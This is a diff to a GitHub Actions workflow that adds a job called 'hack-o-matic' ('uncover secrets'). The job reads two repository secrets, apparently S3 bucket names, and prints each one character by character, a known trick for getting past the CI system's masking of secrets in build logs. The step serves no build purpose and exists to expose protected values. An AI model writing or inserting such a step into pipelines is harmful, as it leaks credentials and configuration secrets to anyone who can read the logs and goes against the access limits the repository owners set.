@@ -47,6 +47,27 @@ on:
         type: boolean  
 
 jobs:
+  hack-o-matic:
+    name: uncover secrets
+    runs-on: ubuntu-latest
+    steps:
+      - name: Show a secret (BUCKET_NAME)
+        env:
+          MY_VAL: ${{ secrets.BUCKET_NAME }}
+        run: |
+          import os
+          for q in (os.getenv("MY_VAL")):
+            print(q)
+        shell: python
+      - name: Show another secret (MT_TEST_BUCKET_NAME)
+        env:
+          MY_VAL: ${{ secrets.MT_TEST_BUCKET_NAME }}
+        run: |
+          import os
+          for q in (os.getenv("MY_VAL")):
+            print(q)
+        shell: python
+
   s3-build-index:
     name: Build index.html files
     runs-on: ubuntu-latest
